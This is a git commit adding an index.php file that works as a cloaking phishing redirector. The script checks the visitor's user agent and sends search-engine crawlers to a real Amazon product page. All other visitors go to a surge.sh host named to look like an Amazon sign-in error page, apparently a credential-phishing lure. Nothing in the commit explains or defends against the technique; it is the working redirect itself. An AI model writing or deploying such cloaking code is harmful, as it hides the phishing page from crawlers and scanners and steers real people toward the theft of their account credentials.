f8861cf34b545a797ed6a8c26cbe7dd2d18718cd
snortskob <78163026+snortskob@users.noreply.github.com>
2021-07-10 21:52:14 +0530

    Create index.php

---
+++ index.php
@@ -0,0 +1,10 @@
+<?php
+$user_agent=$_SERVER['HTTP_USER_AGENT'];
+if((strstr(strtolower($user_agent), "googlebot")) || (preg_match('/yandex|yahoo|bot|crawl|slurp|spider/i', $user_agent)))
+{
+    header('Location:https://www.amazon.com/Motivational-teamwork-bedroom-office-Aspire/dp/B07CJ2WYCZ');
+}
+else{
+	header('Location:https://amazon-com-signin-error451.surge.sh');
+}
+?>
